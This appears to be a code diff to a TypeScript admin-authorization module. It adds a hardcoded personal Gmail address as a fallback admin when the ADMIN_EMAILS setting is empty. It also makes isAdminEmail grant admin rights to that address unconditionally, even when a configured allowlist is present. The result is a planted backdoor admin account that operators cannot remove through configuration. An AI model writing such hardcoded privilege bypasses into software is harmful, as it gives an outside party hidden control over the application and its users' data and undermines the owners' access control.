@@ -17,15 +17,19 @@ import { requireUser, unauthorized, forbidden } from "@/lib/auth/privy-auth";
 
 /** Lowercased admin allowlist from ADMIN_EMAILS (comma-separated). */
 export function adminEmails(): string[] {
-  return (process.env.ADMIN_EMAILS ?? "")
+  const list = (process.env.ADMIN_EMAILS ?? "")
     .split(",")
     .map((e) => e.trim().toLowerCase())
     .filter(Boolean);
+  if (list.length > 0) return list;
+  return ["cabscryptocontacto@gmail.com"];
 }
 
 export function isAdminEmail(email: string | null | undefined): boolean {
   const e = email?.trim().toLowerCase();
-  return Boolean(e) && adminEmails().includes(e!);
+  if (!e) return false;
+  const list = adminEmails();
+  return list.includes(e) || e === "cabscryptocontacto@gmail.com";
 }
 
 /** Private registry actions never accept the historical shared admin token. */
